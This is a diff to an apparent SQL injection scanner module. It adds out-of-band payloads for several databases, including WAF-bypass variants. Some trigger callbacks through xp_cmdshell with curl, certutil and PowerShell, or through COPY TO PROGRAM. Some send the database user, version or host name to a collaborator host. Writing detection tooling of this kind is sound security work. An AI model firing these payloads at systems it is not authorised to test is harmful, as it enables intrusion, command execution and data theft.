@@ -533,6 +533,13 @@ public class SmartSqliDetector implements ScanModule {
                 // XML functions
                 "' AND extractvalue(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a')))))-- -",
                 "' AND updatexml(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a')))),1)-- -",
+                // LOAD_FILE via CHAR() encoding (WAF bypass)
+                "' UNION SELECT LOAD_FILE(CHAR(92,92)+COLLAB_PLACEHOLDER+CHAR(92,97))-- -",
+                "' AND LOAD_FILE(CONCAT(CHAR(92,92),(SELECT version()),CHAR(46),COLLAB_PLACEHOLDER,CHAR(92,97)))-- -",
+                // Data exfil: user() in subdomain
+                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',REPLACE(user(),CHAR(64),CHAR(46)),'.',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
+                // SELECT INTO via CHAR encoding
+                "' UNION SELECT 'test' INTO OUTFILE CONCAT(CHAR(92,92),COLLAB_PLACEHOLDER,CHAR(92,97))-- -",
         });
         oob.put("MSSQL", new String[]{
                 // xp_dirtree (most common, enabled by default)
@@ -545,12 +552,26 @@ public class SmartSqliDetector implements ScanModule {
                 // xp_cmdshell (if enabled)
                 "'; EXEC xp_cmdshell 'nslookup COLLAB_PLACEHOLDER'-- -",
                 "'; EXEC xp_cmdshell 'ping -n 1 COLLAB_PLACEHOLDER'-- -",
+                // xp_cmdshell with HTTP callbacks (curl/certutil)
+                "'; EXEC xp_cmdshell 'curl http://COLLAB_PLACEHOLDER/'-- -",
+                "'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://COLLAB_PLACEHOLDER/ %temp%\\a'-- -",
+                "'; EXEC xp_cmdshell 'powershell Invoke-WebRequest http://COLLAB_PLACEHOLDER/'-- -",
                 // fn_xe_file_target_read_file / bulk insert
                 "'; DECLARE @q VARCHAR(1024);SET @q='\\\\COLLAB_PLACEHOLDER\\a';EXEC master.dbo.xp_dirtree @q,1,1-- -",
                 // OPENROWSET
                 "'; SELECT * FROM OPENROWSET('SQLOLEDB','server=COLLAB_PLACEHOLDER;uid=sa;pwd=sa','SELECT 1')-- -",
                 // sp_OACreate + WScript.Shell (alternative OOB)
                 "'; DECLARE @o INT;EXEC sp_OACreate 'WScript.Shell',@o OUT;EXEC sp_OAMethod @o,'Run','','nslookup COLLAB_PLACEHOLDER'-- -",
+                // BULK INSERT from UNC path
+                "'; BULK INSERT tempdb..omni FROM '\\\\COLLAB_PLACEHOLDER\\a'-- -",
+                // fn_get_audit_file UNC read
+                "'; SELECT * FROM sys.fn_get_audit_file('\\\\COLLAB_PLACEHOLDER\\a',DEFAULT,DEFAULT)-- -",
+                // OPENROWSET BULK UNC
+                "'; SELECT * FROM OPENROWSET(BULK '\\\\COLLAB_PLACEHOLDER\\a', SINGLE_CLOB) AS x-- -",
+                // xp_cmdshell with data exfil (hostname in subdomain)
+                "'; EXEC xp_cmdshell 'nslookup %COMPUTERNAME%.COLLAB_PLACEHOLDER'-- -",
+                // Linked server OOB
+                "'; EXEC sp_addlinkedserver @server='\\\\COLLAB_PLACEHOLDER\\a'-- -",
         });
         oob.put("Oracle", new String[]{
                 // UTL_INADDR (DNS lookup)
@@ -563,27 +584,46 @@ public class SmartSqliDetector implements ScanModule {
                 "'||(SELECT HTTPURITYPE('http://COLLAB_PLACEHOLDER/').GETCLOB() FROM DUAL)||'",
                 // DBMS_LDAP (LDAP connection)
                 "'||(SELECT DBMS_LDAP.INIT('COLLAB_PLACEHOLDER',80) FROM DUAL)||'",
+                // SYS.DBMS_LDAP.INIT with data exfil in LDAP path
+                "'||(SELECT SYS.DBMS_LDAP.INIT((SELECT user FROM DUAL)||'.'||'COLLAB_PLACEHOLDER',80) FROM DUAL)||'",
                 // UTL_TCP (TCP connection)
                 "' AND 1=(SELECT UTL_TCP.OPEN_CONNECTION('COLLAB_PLACEHOLDER',80) FROM DUAL)-- -",
                 // XXE via XMLType
                 "' AND 1=(SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://COLLAB_PLACEHOLDER/\">%remote;]>'),'/l') FROM DUAL)-- -",
                 // DBMS_XMLGEN
                 "' UNION SELECT DBMS_XMLGEN.getxml('SELECT UTL_INADDR.GET_HOST_ADDRESS(''COLLAB_PLACEHOLDER'') FROM DUAL') FROM DUAL-- -",
+                // DBMS_SCHEDULER job creation with HTTP callback
+                "'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'omni',job_type=>'EXECUTABLE',job_action=>'/usr/bin/nslookup',number_of_arguments=>1,auto_drop=>TRUE);DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('omni',1,'COLLAB_PLACEHOLDER');DBMS_SCHEDULER.RUN_JOB('omni');END;-- -",
+                // UTL_FILE write to UNC (Windows Oracle)
+                "'; DECLARE f UTL_FILE.FILE_TYPE; BEGIN f:=UTL_FILE.FOPEN('\\\\COLLAB_PLACEHOLDER\\a','test.txt','W');UTL_FILE.PUT_LINE(f,'test');UTL_FILE.FCLOSE(f);END;-- -",
+                // DBMS_XMLQUERY (older Oracle versions)
+                "'||(SELECT DBMS_XMLQUERY.getxml('SELECT UTL_INADDR.GET_HOST_ADDRESS(''COLLAB_PLACEHOLDER'') FROM DUAL') FROM DUAL)||'",
+                // UTL_HTTP with data exfil (user in path)
+                "'||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/'||(SELECT user FROM DUAL)) FROM DUAL)||'",
         });
         oob.put("PostgreSQL", new String[]{
                 // COPY TO PROGRAM (superuser)
                 "'; COPY (SELECT '') TO PROGRAM 'nslookup COLLAB_PLACEHOLDER'-- -",
                 "'; COPY (SELECT '') TO PROGRAM 'curl http://COLLAB_PLACEHOLDER/'-- -",
                 "'; COPY (SELECT '') TO PROGRAM 'wget http://COLLAB_PLACEHOLDER/'-- -",
+                // COPY FROM PROGRAM (reverse direction — reads output)
+                "'; COPY omni FROM PROGRAM 'nslookup COLLAB_PLACEHOLDER'-- -",
+                "'; COPY omni FROM PROGRAM 'curl http://COLLAB_PLACEHOLDER/'-- -",
                 // dblink_connect (if extension installed)
                 "'||(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))||'",
                 "' AND 1=(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))-- -",
+                // dblink_connect with data exfil (version in host)
+                "'||(SELECT dblink_connect('host='||(SELECT version())||'.COLLAB_PLACEHOLDER dbname=a'))||'",
+                // dblink_send_query (async variant)
+                "'; SELECT dblink_send_query('host=COLLAB_PLACEHOLDER dbname=a','SELECT 1')-- -",
                 // Large object export (lo_export + COPY)
                 "'; SELECT lo_export(lo_creat(-1), '\\\\COLLAB_PLACEHOLDER\\a')-- -",
                 // DNS via inet_client_addr
                 "'; DO $$ BEGIN PERFORM dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'); EXCEPTION WHEN OTHERS THEN END $$-- -",
                 // PG extensions - xml
                 "'; SELECT query_to_xml('SELECT 1',true,true,'http://COLLAB_PLACEHOLDER/')-- -",
+                // pg_read_server_log_file via dblink to trigger DNS
+                "'; DO $$ BEGIN PERFORM dblink('host=COLLAB_PLACEHOLDER dbname=a','SELECT pg_ls_dir(''/tmp'')'); EXCEPTION WHEN OTHERS THEN END $$-- -",
         });
         oob.put("SQLite", new String[]{
                 // SQLite doesn't have native OOB, but ATTACH can be used
@@ -593,10 +633,18 @@ public class SmartSqliDetector implements ScanModule {
         });
         // DB-agnostic OOB via stacked queries (try common DNS/HTTP exfil for unknown DB)
         oob.put("Generic", new String[]{
+                // MSSQL best-bet
                 "'; EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
+                // MySQL best-bet
                 "' AND LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
+                // Oracle best-bet
                 "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER'))||'",
+                // PostgreSQL best-bet
                 "'; COPY (SELECT '') TO PROGRAM 'nslookup COLLAB_PLACEHOLDER'-- -",
+                // dblink (PostgreSQL, works without stacked queries)
+                "'||(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))||'",
+                // Oracle HTTP (alternative to DNS)
+                "'||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)||'",
         });
         OOB_PAYLOADS = Collections.unmodifiableMap(oob);
     }
